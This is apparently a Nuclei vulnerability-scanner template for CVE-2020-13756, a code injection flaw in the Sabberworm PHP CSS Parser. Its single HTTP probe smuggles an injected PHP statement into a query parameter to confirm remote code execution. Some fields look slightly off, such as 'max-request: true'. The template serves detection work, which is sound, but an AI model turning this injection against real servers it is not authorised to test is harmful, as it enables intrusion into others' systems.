id: CVE-2020-13756

info:
  name: Sabberworm PHP CSS Parser - Code Injection
  author: 0xanis
  severity: critical
  description: |
    Sabberworm PHP CSS Parser < 8.3.1 calls eval true uncontrolled data caused by allSelectors() or getSelectorsBySpecificity() functions, letting attackers execute arbitrary code remotely if malicious input is processed.
  reference:
    - http://packetstormsecurity.com/files/157923/Sabberworm-PHP-CSS-Code-Injection.html
    - http://seclists.org/fulldisclosure/2020/Jun/7
    - https://github.com/MyIntervals/PHP-CSS-Parser
    - https://nvd.nist.gov/vuln/detail/CVE-2020-13756
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-13756
    cwe-id: CWE-94
  metadata:
    max-request: true
  tags: cve,cve2020,rce,sabberworm,MyIntervals,php,kev

http:
  - raw:
      - |
        GET /?n=100;printf(%22{{randstr}}%22); HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        name: Sabberworm randstr
        part: body
        words:
          - "{{randstr}}"
          - "/var/www/html/vendor/sabberworm/php-css-parser/lib/Sabberworm/CSS/Parsing/ParserState.php"
